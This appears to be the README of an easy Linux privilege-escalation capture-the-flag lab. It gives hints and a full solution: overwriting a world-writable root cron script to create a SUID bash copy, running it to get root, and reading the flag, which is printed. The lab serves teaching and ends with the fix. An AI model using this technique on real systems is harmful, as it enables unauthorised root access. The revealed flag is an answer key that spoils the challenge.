# Challenge 3  Writable Cron Script

**Difficulty:** Easy  
**Category:** Linux Privilege Escalation  
**Flag:** hidden in `/root/flag.txt`

---

## Story

Stephen runs Candie Manor like clockwork. Every night — every minute, in fact —
an automated task fires as root, updating the plantation's inventory records.

Stephen is meticulous about the schedule. Less meticulous about file permissions.
The script that task calls? Anyone can write to it.

There's a `note.txt` in your home directory. Candie's papers are in `/root/flag.txt`.

---

## Setup

```bash
docker build -t ctf-linux-easy-3 .
docker run -it --rm ctf-linux-easy-3
```

There's a `note.txt` in your home directory with a clue.

---

## Hints

<details>
<summary>Hint 1</summary>
Check what cron jobs exist on the system:

```bash
cat /etc/cron.d/*
ls -la /etc/cron* 
crontab -l
```
</details>

<details>
<summary>Hint 2</summary>
Find the script that root's cron job runs. Check its permissions:

```bash
ls -la /opt/maintenance/cleanup.sh
```

Who can write to it?
</details>

<details>
<summary>Hint 3</summary>
If you can write to a script that root runs, you can put any command in it.
A common trick is to copy `/bin/bash` and give it the SUID bit, then run that copy.
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Discover the cron job

```bash
cat /etc/cron.d/maintenance
```

Output:
```
* * * * * root /opt/maintenance/cleanup.sh
```

Root runs this script every minute.

### Step 2  Check file permissions

```bash
ls -la /opt/maintenance/cleanup.sh
```

Output:
```
-rwxrwxrwx  /opt/maintenance/cleanup.sh
```

Anyone can write to it  including us.

### Step 3  Overwrite the script with a payload

This payload creates a SUID copy of bash:

```bash
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /opt/maintenance/cleanup.sh
```

### Step 4  Wait up to one minute, then use the SUID bash

```bash
# Wait for cron to fire (check every few seconds)
watch -n 2 ls -la /tmp/rootbash

# Once it appears:
/tmp/rootbash -p
```

The `-p` flag preserves the SUID effective UID (root).

### Step 5  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{cr0n_wr1t4bl3_pwn3d}
```

### Why this works

Root's cron job runs a script that any user can modify. By overwriting the script with a malicious payload, the next time cron fires (as root), our payload executes with full root privileges. Scheduled tasks should only call scripts that are writable only by root.

</details>
